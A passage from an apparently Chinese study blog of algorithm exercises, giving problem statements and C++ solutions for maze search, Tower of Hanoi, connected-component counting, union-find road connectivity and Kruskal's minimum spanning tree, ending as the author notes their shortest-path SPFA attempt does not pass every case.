class="built_in">sizeof</span>(m));</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; h; i++)&#123;</span><br><span class="line">			cin &gt;&gt; m[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> sx, sy;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; h; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; w; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(m[i][j] == <span class="string">&#x27;S&#x27;</span>)&#123;</span><br><span class="line">					sx = i;</span><br><span class="line">					sy = j;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> ans = <span class="built_in">bfs</span>(sx, sy);</span><br><span class="line">		cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>DFS也能解决，递归，时间很慢</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">100</span> + <span class="number">5</span>;</span><br><span class="line"><span class="type">char</span> m[maxn][maxn];</span><br><span class="line"><span class="type">int</span> vis[maxn][maxn];</span><br><span class="line"><span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> step)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(step &gt;= ans) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>(m[x][y] == <span class="string">&#x27;E&#x27;</span>)&#123;</span><br><span class="line">		ans = <span class="built_in">min</span>(ans, step);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">		<span class="type">int</span> nx = x + dir[i][<span class="number">0</span>];</span><br><span class="line">		<span class="type">int</span> ny = y + dir[i][<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">if</span>((m[nx][ny]==<span class="string">&#x27;*&#x27;</span>||m[nx][ny]==<span class="string">&#x27;E&#x27;</span>)&amp;&amp;vis[nx][ny] == <span class="number">0</span>)&#123;</span><br><span class="line">			vis[nx][ny] = <span class="number">1</span>;</span><br><span class="line">			<span class="built_in">dfs</span>(nx, ny, step+<span class="number">1</span>);</span><br><span class="line">			vis[nx][ny] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> w, h;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; w &gt;&gt; h)&#123;</span><br><span class="line">		<span class="keyword">if</span>(w == <span class="number">0</span> &amp;&amp; h == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="type">int</span> sx, sy;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; w; i++)&#123;</span><br><span class="line">			cin &gt;&gt; m[i];</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; h; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(m[i][j] == <span class="string">&#x27;S&#x27;</span>)&#123;</span><br><span class="line">					sx = i;</span><br><span class="line">					sy = j;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		ans = <span class="number">0x7ffffff</span>;</span><br><span class="line">		<span class="built_in">dfs</span>(sx, sy, <span class="number">0</span>);</span><br><span class="line">		cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="hanoi塔问题">Hanoi塔问题</h3>
<h5 id="题目描述-32">题目描述</h5>
<p>(n阶Hanoi塔问题）假设有三个分别命名为A、B、C的塔座，在塔座A上插有n(n&lt;20)个直径大小各不相同、依小到大编号为1，2，…，n的圆盘。现要求将A轴上的n个圆盘移至塔座C上并仍按同样顺序叠排，圆盘移动时必须遵循下列规则：
1）每次只能移动一个圆盘； 2）圆盘可以插在A、B、C中的任一塔座上；
3）任何时刻都不能将一个较大的圆盘压在较小的圆盘之上。
请通过编程来打印出移动的步骤.</p>
<h5 id="输入输出格式-30">输入输出格式</h5>
<h6 id="输入描述-32">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">只有一组输入数据.输入数据<span class="built_in">N</span>(<span class="comment">;表示在开始时A塔座上的盘子数</span>),当输入<span class="number">0</span>时程序结束.</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-32">输出描述:</h6>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">输出移动的步骤.如&quot;<span class="selector-tag">A</span>--&gt;C&quot;,&quot;<span class="selector-tag">A</span>--&gt;<span class="selector-tag">B</span>&quot;等.每两的步骤之间有三个空格隔开,每输出<span class="number">5</span>个步骤就换行.详细的见Sample Output.</span><br></pre></td></tr></table></figure>
<p>递归解决</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> jud = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> a, <span class="type">char</span> b, <span class="type">char</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>((jud+<span class="number">1</span>) % <span class="number">5</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;%c--&gt;%c\n&quot;</span>, a, c);</span><br><span class="line">		<span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%c--&gt;%c   &quot;</span>, a, c);</span><br><span class="line">		jud++;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">hanoi</span>(n<span class="number">-1</span>, a, c, b);</span><br><span class="line">	<span class="built_in">hanoi</span>(<span class="number">1</span>, a, b, c);</span><br><span class="line">	<span class="built_in">hanoi</span>(n<span class="number">-1</span>, b, a, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		jud = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">hanoi</span>(n, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="石油储藏">石油储藏</h3>
<h5 id="题目描述-33">题目描述</h5>
<p>有一个GeoSurvComp地质勘探公司正在负责探测地底下的石油块。这个公司在一个时刻调查一个矩形区域，并且创建成一个个的格子用来表示众多正方形块。它然后使用测定设备单个的分析每块区域，决定是否有石油。一块有石油小区域被称为一个pocket，假设两个pocket是相邻的，然后他们就是相同石油块的一部分，石油块可能非常的大并且包涵很多的pocket。你的任务就是在一个网格中存在多少个石油块。输入首先给出图的大小，然后给出这个图。*代表没有石油，<span class="citation" data-cites="代表存在石油">@代表存在石油</span>。输出每种情况下石油块的个数。</p>
<h5 id="输入输出格式-31">输入输出格式</h5>
<h6 id="输入描述-33">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">输入包含一个或多个网格。 每个网格都以包含m和<span class="built_in">n</span>的行开始，网格中的行和列数为m和<span class="built_in">n</span>，以单个空格分隔。 如果m = <span class="number">0</span>，则表示输入结束。 否则为<span class="number">1</span> &lt;= m &lt;= <span class="number">100</span>和<span class="number">1</span> &lt;= <span class="built_in">n</span> &lt;=<span class="number">100</span>。这之后是m行，每行<span class="built_in">n</span>个字符（不计算行末字符）。 每个字符对应一个情节，要么是代表没有油的“ *”，要么是代表油囊的“ @”。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-33">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">在水平，垂直或对角线上都算作相邻，输出每种情况下石油块的个数。</span><br></pre></td></tr></table></figure>
<p>dfs</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">100</span> + <span class="number">5</span>;</span><br><span class="line"><span class="type">char</span> m[maxn][maxn];</span><br><span class="line"><span class="type">int</span> vis[maxn][maxn];</span><br><span class="line"><span class="type">int</span> dir[<span class="number">8</span>][<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">	vis[x][y] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">		<span class="type">int</span> nx = x + dir[i][<span class="number">0</span>];</span><br><span class="line">		<span class="type">int</span> ny = y + dir[i][<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">if</span>(m[nx][ny] == <span class="string">&#x27;@&#x27;</span> &amp;&amp; vis[nx][ny] == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">dfs</span>(nx, ny);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> w, h;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; w &gt;&gt; h)&#123;</span><br><span class="line">		<span class="keyword">if</span>(w == <span class="number">0</span> &amp;&amp; h == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">memset</span>(m, <span class="number">0</span>, <span class="built_in">sizeof</span>(m));</span><br><span class="line">		<span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line"><span class="comment">//		for(int i = 0; i &lt; 100; i++)&#123;</span></span><br><span class="line"><span class="comment">//			for(int j = 0; j &lt; 100; j++)&#123;</span></span><br><span class="line"><span class="comment">//				cout &lt;&lt; vis[i][j] &lt;&lt; &quot; &quot;;</span></span><br><span class="line"><span class="comment">//			&#125;</span></span><br><span class="line"><span class="comment">//		&#125;</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; w; i++)&#123;</span><br><span class="line">			cin &gt;&gt; m[i];</span><br><span class="line">		&#125;</span><br><span class="line">		ans = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; w; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; h; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(m[i][j]==<span class="string">&#x27;@&#x27;</span>&amp;&amp;vis[i][j] == <span class="number">0</span>)&#123;</span><br><span class="line">					ans ++;</span><br><span class="line">					<span class="built_in">dfs</span>(i, j);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h1 id="图论">图论</h1>
<h3 id="畅通工程2">畅通工程2</h3>
<h5 id="题目描述-34">题目描述</h5>
<p>某省调查城镇交通状况，得到现有城镇道路统计表，表中列出了每条道路直接连通的城镇。省政府“畅通工程”的目标是使全省任何两个城镇间都可以实现交通（但不一定有直接的道路相连，只要互相间接通过道路可达即可）。问最少还需要建设多少条道路？</p>
<h5 id="输入输出格式-32">输入输出格式</h5>
<h6 id="输入描述-34">输入描述:</h6>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">测试输入包含若干测试用例。每个测试用例的第1行给出两个正整数，分别是城镇数目N ( &lt;<span class="number"> 1000 </span>)和道路数目M；随后的M行对应M条道路，每行给出一对正整数，分别是该条道路直接连通的两个城镇的编号。为简单起见，城镇从1到N编号。 </span><br><span class="line">    注意:两个城市之间可以有多条道路相通,也就是说</span><br><span class="line">   <span class="number"> 3 </span>3</span><br><span class="line">   <span class="number"> 1 </span>2</span><br><span class="line">   <span class="number"> 1 </span>2</span><br><span class="line">   <span class="number"> 2 </span>1</span><br><span class="line">    这种输入也是合法的</span><br><span class="line">    当N为0时，输入结束，该用例不被处理。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-34">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">对每个测试用例，在1行里输出最少还需要建设的道路数目。</span><br></pre></td></tr></table></figure>
<p>并查集</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> f[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initial</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		f[i] = i;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x == f[x]) <span class="keyword">return</span> x;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line">		<span class="keyword">return</span> f[x];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">initial</span>(n);</span><br><span class="line">		<span class="type">int</span> x, y, ans = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">			cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">			<span class="type">int</span> fx = <span class="built_in">find</span>(x);</span><br><span class="line">			<span class="type">int</span> fy = <span class="built_in">find</span>(y);</span><br><span class="line">			<span class="keyword">if</span>(fx != fy)&#123;</span><br><span class="line">				ans++;</span><br><span class="line">				f[fx] = fy;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; n - ans - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>加入merge</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> f[maxn], rank[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initial</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		f[i] = i;</span><br><span class="line">		rank[i] = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x == f[x]) <span class="keyword">return</span> x;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line">		<span class="keyword">return</span> f[x];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> fx = <span class="built_in">find</span>(x), fy = <span class="built_in">find</span>(y);</span><br><span class="line">	<span class="keyword">if</span>(rank[x] &lt;= rank[y])&#123;</span><br><span class="line">		f[fx] = fy;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		f[fy] = fx;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(rank[fx] == rank[fy] &amp;&amp; fx != fy)&#123;</span><br><span class="line">		rank[fy]++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		cin &gt;&gt; m;</span><br><span class="line">		<span class="built_in">initial</span>(n);</span><br><span class="line">		<span class="type">int</span> x, y, ans = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">			cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">			<span class="type">int</span> fx = <span class="built_in">find</span>(x);</span><br><span class="line">			<span class="type">int</span> fy = <span class="built_in">find</span>(y);</span><br><span class="line">			<span class="keyword">if</span>(fx != fy)&#123;</span><br><span class="line">				ans++;</span><br><span class="line">				<span class="built_in">merge</span>(fx, fy);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; n - ans - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="畅通工程">畅通工程</h3>
<h4 id="题目描述-35">题目描述</h4>
<p>省政府“畅通工程”的目标是使全省任何两个村庄间都可以实现公路交通（但不一定有直接的公路相连，只要能间接通过公路可达即可）。经过调查评估，得到的统计表中列出了有可能建设公路的若干条道路的成本。现请你编写程序，计算出全省畅通需要的最低成本。</p>
<h5 id="输入输出格式-33">输入输出格式</h5>
<h6 id="输入描述-35">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">测试输入包含若干测试用例。每个测试用例的第<span class="number">1</span>行给出评估的道路条数 <span class="built_in">N</span>、村庄数目M (<span class="built_in">N</span>, M &lt; =<span class="number">100</span> )；随后的 <span class="built_in">N</span> 行对应村庄间道路的成本，每行给出一对正整数，分别是两个村庄的编号，以及此两村庄间道路的成本（也是正整数）。为简单起见，村庄从<span class="number">1</span>到M编号。当<span class="built_in">N</span>为<span class="number">0</span>时，全部输入结束，相应的结果不要输出。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-35">输出描述:</h6>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">对每个测试用例，在<span class="number">1</span>行里输出全省畅通需要的最低成本。若统计数据不足以保证畅通，则输出“<span class="string">?”</span>。</span><br></pre></td></tr></table></figure>
<p>克鲁斯卡尔算法+合并集(注释是因为不知道为什么加入rank会报错)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">100</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> f[maxn];</span><br><span class="line"><span class="comment">//int rank[maxn];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">	<span class="type">int</span> u, v, w;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">struct</span> node a, <span class="keyword">struct</span> node b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.w &lt; b.w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initial</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		f[i] = i;</span><br><span class="line"><span class="comment">//		rank[i] = 1;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x == f[x]) <span class="keyword">return</span> x;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line">		<span class="keyword">return</span> f[x];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//void merge(int x, int y)&#123;</span></span><br><span class="line"><span class="comment">//	int fx = find(x), fy = find(y);</span></span><br><span class="line"><span class="comment">//	if(rank[x] &lt;= rank[y])&#123;</span></span><br><span class="line"><span class="comment">//		f[fx] = fy;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	else&#123;</span></span><br><span class="line"><span class="comment">//		f[fy] = fx;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	if(rank[fx] == rank[fy] &amp;&amp; fx != fy)&#123;</span></span><br><span class="line"><span class="comment">//		rank[fy]++;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">initial</span>(m);</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">node</span> edge[n];</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; edge[i].u &gt;&gt; edge[i].v &gt;&gt; edge[i].w;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">sort</span>(edge, edge+n, cmp);</span><br><span class="line">		<span class="type">int</span> ans = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			<span class="type">int</span> fx = <span class="built_in">find</span>(edge[i].u), fy = <span class="built_in">find</span>(edge[i].v);</span><br><span class="line">			<span class="keyword">if</span>(fx != fy)&#123;</span><br><span class="line">				ans++;</span><br><span class="line">				r += edge[i].w;</span><br><span class="line">				f[fx] = fy;</span><br><span class="line"><span class="comment">//				merge(fx, fy);</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(m - <span class="number">1</span> &gt; ans)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;?&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			cout &lt;&lt; r &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="最短路">最短路</h3>
<h5 id="题目描述-36">题目描述</h5>
<p>在每年的校赛里，所有进入决赛的同学都会获得一件很漂亮的t-shirt。但是每当我们的工作人员把上百件的衣服从商店运回到赛场的时候，却是非常累的！所以现在他们想要寻找最短的从商店到赛场的路线，你可以帮助他们吗？</p>
<h5 id="输入输出格式-34">输入输出格式</h5>
<h6 id="输入描述-36">输入描述:</h6>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">输入包括多组数据。每组数据第一行是两个整数<span class="built_in">N</span>、<span class="variable">M</span>（<span class="built_in">N</span><span class="operator">&lt;=</span><span class="number">100</span>，<span class="variable">M</span><span class="operator">&lt;=</span><span class="number">10000</span>），<span class="built_in">N</span>表示成都的大街上有几个路口，标号为<span class="number">1</span>的路口是商店所在地，标号为<span class="built_in">N</span>的路口是赛场所在地，<span class="variable">M</span>则表示在成都有几条路。<span class="built_in">N</span><span class="operator">=</span><span class="variable">M</span><span class="operator">=</span><span class="number">0</span>表示输入结束。接下来<span class="variable">M</span>行，每行包括<span class="number">3</span>个整数<span class="variable">A</span>，<span class="variable">B</span>，<span class="built_in">C</span>（<span class="number">1</span><span class="operator">&lt;=</span><span class="variable">A</span><span class="operator">,</span><span class="variable">B</span><span class="operator">&lt;=</span><span class="built_in">N</span><span class="operator">,</span><span class="number">1</span><span class="operator">&lt;=</span><span class="built_in">C</span><span class="operator">&lt;=</span><span class="number">1000</span>）<span class="operator">,</span>表示在路口<span class="variable">A</span>与路口<span class="variable">B</span>之间有一条路，我们的工作人员需要<span class="built_in">C</span>分钟的时间走过这条路。</span><br><span class="line">输入保证至少存在<span class="number">1</span>条商店到赛场的路线。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-36">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">对于每组输入，输出一行，表示工作人员从商店走到赛场的最短时间</span><br></pre></td></tr></table></figure>
<p>我写的spfa不能通过全部的</p>
